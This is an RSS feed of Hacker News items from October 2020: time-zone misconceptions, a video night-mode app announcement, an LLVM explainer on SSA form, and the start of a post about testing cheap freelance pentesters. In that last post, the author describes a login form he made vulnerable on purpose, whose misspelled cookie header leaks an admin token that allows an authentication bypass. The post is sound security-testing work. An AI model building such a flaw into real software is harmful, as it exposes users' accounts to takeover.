Arizona doesn't practice Daylight Saving Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/arizona-dst.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/arizona-dst.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/arizona-dst.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/arizona-dst.jpeg 1575w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-18-the-entire-state-always-shifts-during-daylight-saving-time">Misconception #18: <strong>The entire state always shifts during Daylight Saving Time</strong></h3><p>Within Arizona, the Navajo Nation happily follows Daylight Saving Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/navajo-nation.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/navajo-nation.jpeg 600w, https://www.zainrizvi.io/content/images/2020/10/navajo-nation.jpeg 760w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-19-other-than-dst-every-city-within-a-state-follows-the-same-time-zone">Misconception #19: <strong>Other than DST, every city within a state follows the same time zone</strong></h3><p>In Indiana, USA, most cities follow Eastern Standard Time but a few decided to follow Central Standard Time</p><h3 id="misconception-20-every-city-sits-within-exactly-one-time-zone">Misconception #20: <strong>Every city sits within exactly one time zone</strong></h3><p>A few times in history, state line or time zone lies got drawn without …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/">https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/</a></em></p>]]>
            </description>
            <link>https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870376</guid>
            <pubDate>Fri, 23 Oct 2020 15:18:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Our Abusive Relationship with Mozilla’s Firefox]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 118 (<a href="https://news.ycombinator.com/item?id=24869658">thread link</a>) | @zdw
<br/>
October 23, 2020 | https://ruzkuku.com/txt/moz-rel.html | <a href="https://web.archive.org/web/*/https://ruzkuku.com/txt/moz-rel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ruzkuku.com/txt/moz-rel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869658</guid>
            <pubDate>Fri, 23 Oct 2020 14:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Video Night Mode with real-time AI-powered denoising and frame boosting]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869657">thread link</a>) | @soonpls
<br/>
October 23, 2020 | https://neural.cam/news/nightvideo/ | <a href="https://web.archive.org/web/*/https://neural.cam/news/nightvideo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div id="main">
    <div>
      <div>
        <div role="article">

          <div>
            

<p>Hey everyone, <br>

for the past few months we have been working on a new product, and today we’re finally ready to show it to you.
</p>

<div><p>As you probably know, at NeuralCam we have a <a href="https://apps.apple.com/us/app/neuralcam-nightmode/id1474856599" target="_blank">photo NightMode app</a> that’s recognized as the leading night mode solution for iPhones without a built-in photo Night Mode. Ever since the launch of our night mode app, a question kept popping up from our users: <i>“can you build a night mode app for video?”</i>, they asked. 
</p><p>

We’ve pondered this for a while. Unlike photography, there is no obvious straightforward way to build night mode for video. In the case of photos, night mode usually means taking multiple shots with relatively long exposure and combining them into one high quality image. Then brightening and post-processing it for a final look. 

 </p></div>



<p><b>Video</b> is a different beast: you can’t just shoot multiple frames and combine them because you’re limited by both the maximum exposure time a frame can have and by the maximum processing time per frame (milliseconds instead of seconds in the case of real-time video). 

</p>

<p>Clearly, a very different approach is needed. We’ve explored everything from classic to AI-powered video processing techniques and we think we found the right mix of tech that results in much improved low light videos. After months of researching, hacking and developing, we’re proud to present NeuralCam NightVideo, our (and perhaps the world’s first) <b>Video Night Mode</b> app.

</p>
<p><img src="https://neural.cam/news/nightvideo/content/nvid.png">
</p>
<br>

<h3 id="when-they-ghost-mid-project">Night Mode Video</h3>

<p>So how can we build Video NightMode? Where do we get started and why can’t we just take a normal video and brighten it up? Well, because it would look really bad.
</p>

<p>The biggest problem in low light videography (and photography for that matter) is the presence of noise. There’s just too little amount of light hitting the image sensor and this lack of information results in a flickering mess of pixels with different light intensities and colors appearing especially in the darker areas of the scene - not a pleasant view.
</p>
<p>In the case of the photography night mode, this noise is reduced by the mentioned frame merging process - which basically results in more information being added to the target frame. However, with video we don’t have the luxury of multiple frames and processing for seconds to do the processing so we’ll clearly have to find a very different approach. 

</p><h3 id="when-they-ghost-mid-project">Capturing and AI frame-boosting</h3>

<p>The first thing we’re doing is to try to capture the most light inside each frame, which naturally results in less noisy frames. 

</p>

<p>As a standard practice, videos are shot at a shutter speed of no more than 1/24 to keep moving objects sharp and the video smooth. But this also means that this is the maximum amount of time that light can reach the sensor.
</p>

<p>We’ve looked very closely at this problem and figured that there might be a way to let more light in while maintaining the smooth look of the video, namely a combination of longer exposure times and frame interpolation. This way we can use exposure times longer than 1/24 depending on the amount of available light, and then in order to keep the video looking smooth, we generate additional frames using a proprietary Machine Learning powered Video Interpolation algorithm that we’ve built especially for this purpose.</p>

<p>
 The result is a smooth video with a tiny amount of blur - depending on the used settings - and generally a nice “night video” look.

</p>

<p><img src="https://neural.cam/news/nightvideo/content/interp.png">
<br>
</p>



<h3 id="when-they-ghost-mid-project">AI Powered Video Denoising</h3>


<p>Doing the capturing part this way we’ve got higher quality frames, but these generally still have a lot of noise so what we’ll do next is to try to get rid of that.
</p>

<p>It turns out that classic denoising methods aren’t good enough for this case, they usually blur the whole image, including edges and are helpless at the noise levels present in low light shots taken with a smartphone camera. Also, they’re quite slow as well.
</p>

<p>To solve this problem we’ve built a Machine Learning-based denoising algorithm. Specially developed for the iPhone camera, it removes even the heaviest noise and does so selectively and adaptively only on the areas of the image where noise is present. The result is a much cleaner look in the bright areas of the video and a massive reduction of the ugly flickering effect in the darker parts of the image. 
</p>
<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/denoise.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>

<h3>Brightening</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<h3>Different Video Night Modes</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>
<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/nightvideo.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>
<p>In order to cover as many shooting situations as possible we’ve come up with 5 different capture modes:

</p>



<h4>Day:
</h4>



<p>The first capturing mode is not even a night mode at all. It is targeted at lower light day shots, or scenes with high dynamic range where the results of the default iPhone camera start to get too noisy. This mode contains no brightening, but because of the use of our AI denoising algorithm, resulting videos have a cleaner, more pleasant look. It’s especially useful when used with the ultra wide camera, in the case of which noise can appear even in medium-lit indoor situations.

</p>

<h4>Dusk:</h4>

<p>
  
  This mode is designed for semi-low light. It is similar to Day mode, shot at a high frame rate to maintain sharp subjects in high movement situations, but in addition to denoising it also includes a bit of additional brightening. 

</p>
<h4>
Night:
</h4>

<p>The “Night” mode is the default mode for shooting night videos. It uses a slightly longer exposure time, that combined with our denoising and frame interpolation algorithms generates a bright, clean and smooth night video. This is the mode to use for most night scenes. 
</p>

<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/building.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>


<h4>Night+:</h4>

<p>A further enhanced mode for really dark scenes. In this mode, videos have an additional amount of blur but provide a brighter night video with the same clean noise-less look. In most of these situations the built-in camera can't produce usable results.

</p>

<h4>Time-lapse:</h4>

<p>A Night Time-lapse mode, similar to the one on the new iPhone 12 default camera - now made available by NeuralCam NightVideo for older iPhones too. This mode doesn’t have sound and can handle even lower light situations, which combined with a faster playback, generates the specific night mode time-lapse look. 

</p>

<p> <video width="700" autoplay="" muted="" no-controls="" loop=""> 
<source src="https://neural.cam/news/nightvideo/content/timelapse.mp4" type="video/mp4">
Your browser does not support the video tag.</video>
<br>
</p>

<h4>*Gentle Light:</h4>

<p>Each of the modes can be combined with the “gentle light” feature, where the app turns on the flashlight, but at one of the lowest levels in order to keep the resulting video still natural and avoid “blinding” people. Gentle light can be used in totally dark scenes with subjects that are close enough to be illuminated by a small amount of light.
</p>

<h3>Real-time on-device processing</h3>

<p>All this processing runs in real-time on the iPhone, making full use of the power the NeuralEngine provides. This real-time processing means that we can provide the same instant video capturing experience you’re used to with your default camera - tap to capture and everything is displayed and processed on the fly. Since this level of video processing requires quite some processing power, NightVideo is only available on devices with the A12 NeuralEngine (iPhone XR and later) and iOS 14.


</p><p>

  With real-time processing and modes covering everything from slightly low light settings to really dark scenes, NeuralCam NightVideo is the first app to provide Night Mode for Video.
</p>


<div><p>You can purchase the NeuralCam NightVideo app from the App Store, using the link below. Make sure to send us all your feedback over at <a href="mailto:hello@neural.cam">hello@neural.cam</a> - we'd love to hear from you.</p></div>

</div></div></div></div></div></div></div>]]>
            </description>
            <link>https://neural.cam/news/nightvideo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869657</guid>
            <pubDate>Fri, 23 Oct 2020 14:09:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding static single assignment forms]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24869227">thread link</a>) | @woodruffw
<br/>
October 23, 2020 | https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms | <a href="https://web.archive.org/web/*/https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
      <li><a href="https://yossarian.net/">Main Site</a></li>
    
</ul>

<hr>



<h2>
  <em>Oct 23, 2020</em>
</h2>

  <p>Tags:
  
    
    <a href="https://blog.yossarian.net/tags#llvm">llvm</a>,
    
  
    
    <a href="https://blog.yossarian.net/tags#programming">programming</a>
    
  
  </p>


<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>)</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%fname.addr</span> <span>=</span> <span>alloca</span> <span>i8</span><span>*,</span> <span>align</span> <span>8</span>
  <span>%flags</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>%fd</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>store</span> <span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>store</span> <span>i32</span> <span>2</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%0</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool</span> <span>=</span> <span>icmp</span> <span>ne</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>br</span> <span>i1</span> <span>%tobool</span><span>,</span> <span>label</span> <span>%if.end</span><span>,</span> <span>label</span> <span>%if.then</span>

<span>if.then:</span>                                          <span>; preds = %entry</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%or</span> <span>=</span> <span>or</span> <span>i32</span> <span>%1</span><span>,</span> <span>64</span>
  <span>store</span> <span>i32</span> <span>%or</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>br</span> <span>label</span> <span>%if.end</span>

<span>if.end:</span>                                           <span>; preds = %if.then, %entry</span>
  <span>%2</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%3</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%2</span><span>,</span> <span>i32</span> <span>%3</span><span>,</span> <span>i32</span> <span>420</span><span>)</span>
  <span>store</span> <span>i32</span> <span>%call1</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>%4</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>ret</span> <span>i32</span> <span>%4</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool.not</span> <span>=</span> <span>icmp</span> <span>eq</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</a></em></p>]]>
            </description>
            <link>https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869227</guid>
            <pubDate>Fri, 23 Oct 2020 13:27:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Penetration testing and low-cost freelancing]]>
            </title>
            <description>
<![CDATA[
Score 152 | Comments 71 (<a href="https://news.ycombinator.com/item?id=24869219">thread link</a>) | @sophron
<br/>
October 23, 2020 | https://sophron.github.io/lowcost-freelancing-pentest/ | <a href="https://web.archive.org/web/*/https://sophron.github.io/lowcost-freelancing-pentest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
    <div id="content">


<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
